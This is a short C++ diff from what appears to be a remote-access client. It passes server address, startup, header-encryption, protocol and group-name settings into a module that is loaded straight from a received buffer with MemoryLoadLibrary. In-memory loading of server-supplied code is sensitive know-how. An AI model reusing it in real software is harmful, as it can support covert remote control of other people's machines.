@@ -188,6 +188,11 @@ public:
             memset(addr->szFlag, 0, sizeof(addr->szFlag));
             strcpy(addr->szServerIP, g_ConnectAddress.ServerIP());
             sprintf_s(addr->szPort, "%d", g_ConnectAddress.ServerPort());
+			addr->iStartup = g_ConnectAddress.iStartup;
+			addr->iHeaderEnc = g_ConnectAddress.iHeaderEnc;
+			addr->protoType = g_ConnectAddress.protoType;
+			addr->runningType = g_ConnectAddress.runningType;
+            strcpy(addr->szGroupName, g_ConnectAddress.szGroupName);
         }
         m_mod = ::MemoryLoadLibrary(buffer + 6 + sizeof(PkgHeader), size);
         SAFE_DELETE_ARRAY(buffer);
